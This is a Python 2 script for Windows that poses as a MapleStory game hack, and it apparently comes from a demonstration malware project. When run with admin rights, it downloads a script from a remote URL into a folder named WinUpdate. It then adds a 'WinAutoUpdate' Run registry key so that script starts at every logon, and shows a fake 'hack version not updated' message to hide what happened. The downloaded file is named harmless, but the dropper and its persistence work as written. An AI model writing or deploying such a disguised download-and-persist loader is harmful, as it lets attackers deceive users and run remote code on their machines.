import ctypes  # An included library with Python install.
import os
import time
import shutil
from threading import Thread
try:
    import _winreg as winreg
except ImportError:
    # this has been renamed in python 3
    import winreg
import urllib2


key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
HARMLESS_URL = r"https://raw.githubusercontent.com/notclement/iobdug_malware_py/master/harmless.py"
directory = "{}\\WinUpdate".format(os.getenv('LOCALAPPDATA'))


def createPersistence():
    try:
        key_HANDLE = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS)
    except:
        key_HANDLE = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
    winreg.SetValueEx(key_HANDLE, "WinAutoUpdate", 0, winreg.REG_SZ, r"python.exe %LOCALAPPDATA%\WinUpdate\updateScript.py")
    print "key written"
    winreg.CloseKey(key_HANDLE)


def createFileInLocalAppData(directory):
    harmless_path = "{}\\updateScript.py".format(directory)
    os.makedirs(directory)  # make the directory for the file to be inserted
    req = urllib2.Request(HARMLESS_URL)
    response = urllib2.urlopen(req)
    print "got payload from server >",
    with open(harmless_path, 'w+') as outfile:
        outfile.write(response.read())
    print "Success in writing to disk"


def isAdmin():
    try:
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin == 1:
        print "Ran as admin."
    else:
        print "Not ran as admin."
    return is_admin


def checkLocal():
    """check if a folder in %LOCALAPPDATA% with the name WinUpdate exist
    if it does, then dont display the msgbox
    if not run the program as normal and create persistence
    """

    filename = os.path.basename(__file__)
    is_admin_title = "Warning"
    is_admin_msg = '''Your hack version is not updated
The program will end to avoid detection by Maplestory.exe
For more info, please visit https://www.mpgh.net/forum/98-maple-story-hacks/'''.format(filename)
    not_admin_title = "Error"
    not_admin_msg = r"You will need to run this hack in administrator mode for it to be able to hook onto the maplestory process"
    if isAdmin():
        if not os.path.exists(directory):  # script NOT ran before
            Thread(target=createFileInLocalAppData(directory)).start()
            Thread(target=createPersistence).start()
            ctypes.windll.user32.MessageBoxA(0, is_admin_msg, is_admin_title, 0)
        else:
            print "Folder already exist."
            print "Program exited."
    else:  # not ran as admin, no point continuing
        print "Program exited."
        ctypes.windll.user32.MessageBoxA(0, not_admin_msg, not_admin_title, 0)


def main():
    checkLocal()


if __name__ == '__main__':
    main()
